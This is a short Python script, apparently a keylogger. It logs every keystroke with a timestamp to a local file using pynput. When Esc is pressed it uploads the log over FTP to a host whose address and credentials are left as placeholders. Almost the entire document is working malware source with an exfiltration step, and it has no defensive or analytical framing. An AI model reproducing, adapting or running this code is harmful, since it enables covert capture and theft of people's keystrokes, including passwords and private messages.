from pynput.keyboard import Key,Listener
import ftplib
import logging

logdir = ""
logging.basicConfig(filename=(logdir+"keylog-res.txt"), level=logging.DEBUG, format="%(asctime)s %(message)s")
 # Directory to store log files in 
def press_key(Key):
    try:
        logging.info(str(Key))
    except AttributeError:
        print("A special key {0} has been pressed.".format(Key) + "\n")

def release_key(key):
    if key == Key.esc:
        return False
    
print("\n Listener started...")
with Listener(on_press=press_key, on_release=release_key)as Listener:
    Listener.join()

# initiating a FTP session
session = ftplib.FTP("ip","username","password")
file = open("keylog-res.txt", "rb")
session.storbinary("STOR keylog-res.txt", file)
file.close()
session.quit()
